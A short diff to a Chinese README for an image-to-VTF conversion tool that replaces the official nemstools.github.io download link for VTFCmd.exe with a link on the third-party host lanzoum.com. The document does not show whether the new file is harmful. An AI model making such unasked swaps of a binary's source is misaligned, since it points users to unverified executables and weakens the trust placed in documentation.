@@ -48,7 +48,7 @@
 
 ### 1. 准备工作
 本工具底层依赖于 VTFLib 的核心组件，请务必先下载它：
-- 下载并解压 [VTFCmd.exe](https://nemstools.github.io/pages/VTFLib-Download.html) 及其配套的 dll 文件。
+- 下载并解压 [VTFCmd.exe](https://qualifing.lanzoum.com/iJJIT3pgau4j) 及其配套的 dll 文件。
 
 ### 2. 运行软件
 1. 前往本仓库的 **Releases** 页面，下载最新版本的 `SP2VTF_v*.tar.gz`。
